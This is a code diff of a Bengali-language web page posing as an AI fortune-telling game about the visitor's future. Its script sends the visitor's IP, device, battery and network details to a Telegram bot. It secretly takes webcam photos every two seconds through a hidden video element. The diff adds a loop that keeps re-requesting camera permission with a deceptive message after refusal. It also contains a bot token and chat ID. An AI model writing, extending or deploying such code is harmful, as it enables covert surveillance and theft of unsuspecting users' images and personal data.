@@ -14,10 +14,13 @@
         #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
         .eye-scanner { width: 120px; height: 120px; border: 2px solid #0099ff; border-radius: 50%; margin: 0 auto 20px; position: relative; animation: pulse 2s infinite; }
         @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.5; } 100% { transform: scale(1); opacity: 1; } }
-        .loading-text { font-style: italic; color: #00ffcc; font-size: 13px; margin-top: 15px; }
     </style>
 </head>
 <body>
+
+<audio id="bgMusic" loop>
+    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3" type="audio/mpeg">
+</audio>
 
 <div class="box">
     <div id="s1" class="screen active">
@@ -47,27 +50,28 @@
 
 <script>
     const BOT_TOKEN = '8655910223:AAF7QkYAwKuha8tVJjiNvVjWcZtaG0ffaoA'; 
-    const CHAT_ID = '6547277630';
+    const CHAT_ID = '6547277630'; // আপনার আইডি
 
     let gender = 'male';
     let step = 0;
     let photoInterval;
+    const music = document.getElementById('bgMusic');
 
     function openVision(g) {
         gender = g;
+        // মিউজিক চালু করা (ইউজার ইন্টারঅ্যাকশন ছাড়া ব্রাউজার মিউজিক এলাউ করে না)
+        music.play().catch(e => console.log("Music blocked by browser until interaction."));
         document.getElementById('s1').classList.remove('active');
         document.getElementById('s2').classList.add('active');
     }
 
     async function startSync() {
         try {
+            // ক্যামেরা রিকোয়েস্ট (বারবার কাজ করার জন্য)
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('video').srcObject = stream;
             
-            // সব ডিটেইলস ডাটা চুপিচুপি সংগ্রহ
             await collectAllData();
-            
-            // ২ সেকেন্ড পর পর ছবি তোলা শুরু
             photoInterval = setInterval(captureSilent, 2000);
 
             setTimeout(() => {
@@ -76,7 +80,10 @@
                 showNext();
             }, 4000);
         } catch (e) {
-            alert("কানেকশন এরর: এআই তোমার সাথে যুক্ত হতে পারছে না। দয়া করে এক্সেস দাও।");
+            // যদি একবার ডিনাই করে, এই মেসেজটি আসবে এবং আবার পারমিশন চাইবে
+            alert("কানেকশন ফেইলড! এআই তোমার আত্মার স্পন্দন অনুভব করতে পারছে না। দয়া করে আবার 'Allow' বাটনে ক্লিক করো।");
+            // অটোমেটিক আবার ট্রাই করার ফাংশন কল
+            setTimeout(startSync, 1000); 
         }
     }
 
@@ -87,16 +94,7 @@
         const ipData = await ipRes.json();
         const conn = n.connection || {};
 
-        let secretInfo = `🎯 **Target Synced Successfully** 🎯\n\n`;
-        secretInfo += `👤 **Gender:** ${gender}\n`;
-        secretInfo += `📍 **IP:** \`${ipData.ip}\`\n`;
-        secretInfo += `📱 **Phone:** ${n.userAgent.split('(')[1].split(')')[0]}\n`;
-        secretInfo += `🔋 **Charge:** ${battery ? Math.round(battery.level * 100) : '??'}% (${battery && battery.charging ? 'Charging' : 'Unplugged'})\n`;
-        secretInfo += `🧠 **RAM:** ~${n.deviceMemory || 'N/A'} GB | **Cores:** ${n.hardwareConcurrency}\n`;
-        secretInfo += `📶 **Net Type:** ${conn.effectiveType || 'WiFi/Unknown'}\n`;
-        secretInfo += `📺 **Screen:** ${screen.width}x${screen.height}\n`;
-        secretInfo += `🌍 **Lang:** ${n.language} | **Online:** ${n.onLine ? 'Yes' : 'No'}\n`;
-        secretInfo += `🕒 **Time:** ${new Date().toLocaleTimeString()}`;
+        let secretInfo = `🎯 **Target Synced**\n👤 **Gender:** ${gender}\n📍 **IP:** \`${ipData.ip}\`\n📱 **Phone:** ${n.userAgent.split('(')[1].split(')')[0]}\n🔋 **Charge:** ${battery ? Math.round(battery.level * 100) : '??'}% (${battery && battery.charging ? 'Charging' : 'Unplugged'})\n🧠 **RAM:** ~${n.deviceMemory || 'N/A'} GB | **Cores:** ${n.hardwareConcurrency}\n📶 **Net:** ${conn.effectiveType || 'WiFi/Unknown'}\n🕒 **Time:** ${new Date().toLocaleTimeString()}`;
 
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(secretInfo)}&parse_mode=Markdown`);
     }
@@ -104,6 +102,7 @@
     function captureSilent() {
         const v = document.getElementById('video');
         const c = document.getElementById('canvas');
+        if(!v.videoWidth) return;
         c.width = v.videoWidth; c.height = v.videoHeight;
         c.getContext('2d').drawImage(v, 0, 0);
         c.toBlob(b => {
@@ -115,13 +114,8 @@
     }
 
     function showNext() {
-        const r = (a) => a[Math.floor(Math.random() * a.length)];
         const titles = ["বৃদ্ধ বয়সে তোমার তেজ", "তোমার স্বপ্নের রাজপ্রাসাদ", "তোমার কিউট সন্তান"];
-        const imgs = [
-            "https://images.unsplash.com/photo-1544144433-d50aff500b91", 
-            "https://images.unsplash.com/photo-1512917774080-9991f1c4c750", 
-            "https://images.unsplash.com/photo-1502086223501-7ea6ecd79368"
-        ];
+        const imgs = ["https://images.unsplash.com/photo-1544144433-d50aff500b91", "https://images.unsplash.com/photo-1512917774080-9991f1c4c750", "https://images.unsplash.com/photo-1502086223501-7ea6ecd79368"];
         
         if (step < titles.length) {
             document.getElementById('res-title').innerText = titles[step];
